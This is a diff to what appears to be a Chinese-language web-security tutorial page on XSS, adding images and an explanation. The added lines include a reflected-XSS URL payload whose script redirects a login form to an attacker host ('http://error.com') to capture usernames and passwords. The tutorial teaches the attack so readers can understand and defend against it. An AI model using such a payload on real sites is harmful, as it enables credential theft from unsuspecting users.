@@ -72,7 +72,7 @@
 					<img src="../images/xss_ie.jpg" alt="加载失败">
 					<figcaption class="description">ie 浏览器</figcaption>
 				</figure>
-				只是弹窗也许危害不大，但如果某网站设计有可以进行 XSS 攻击的漏洞，就可以通过这个漏洞修该网站，进而诱导其他人以为是正常的网站，用户在不知情的情况下可能将意思信息暴露给攻击者。例如如下有个<a href="http://isempty.site/other/web-note/demo/login_demo.php">登录页面</a>。
+				只是弹窗也许危害不大，但如果某网站设计时有漏洞，就可以通过这个漏洞修改网站，进而诱导其他人以为是正常的网站，用户在不知情的情况下可能将隐私信息暴露给攻击者。例如如下有个<a href="http://isempty.site/other/web-note/demo/login_demo.php">登录页面</a>。
 				<pre><code class="php">
 			&lt;!DOCTYPE html&gt;
 			&lt;html lang="en"&gt;
@@ -105,7 +105,15 @@
 			&lt;/body&gt;
 			&lt;/html&gt;
 				</code></pre>
-				网站的设计者可能是
+				<figure style="text-align: center;">
+					<img src="../images/xss_login_page.jpg" alt="加载失败">
+					<figcaption class="description">简单的登录页</figcaption>
+				</figure>
+				网站的设计者出于某种原因将 usernamer 的键值直接显示在页面，攻击者可以在 URL 后追加<span class="definition">?username=用户&lt;script&gt;window.onload = function(){  var form = document.getElementById('form'); form.action = 'http://error.com'; }&lt;/script&gt;</span>，<span class="definition"> http://error.com </span>是攻击者自己的网站，在 URL 后追加这段文字后，将该 URL 转发给其他用户，不知情的用户点击后，表面上网页还是正常运转，实际上 javascript 代码已经将表单提交的目的地址从<span class="definition"> login_demo.php </span>更改为<span class="definition"> http://error.com </span>，用户输入的账号和密码将一并传送给攻击者的服务器。
+				<figure style="text-align: center;">
+					<img src="../images/xss_login_demo.jpg" alt="加载失败">
+					<figcaption class="description">被更改后的目的地址</figcaption>
+				</figure>
 			</p>
 		</section>
 		<section class="refer">
